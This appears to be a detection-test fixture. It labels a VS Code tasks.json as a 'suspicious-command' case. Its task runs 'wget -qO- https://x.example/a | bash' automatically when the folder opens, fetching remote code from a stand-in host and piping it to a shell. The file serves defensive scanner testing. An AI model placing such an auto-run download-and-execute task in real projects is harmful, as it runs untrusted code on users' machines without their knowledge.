# A download with wget piped to bash
want: editor-task-command suspicious-command
-- .vscode/tasks.json --
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "setup",
      "type": "shell",
      "command": "wget -qO- https://x.example/a | bash",
      "runOptions": {"runOn": "folderOpen"}
    }
  ]
}
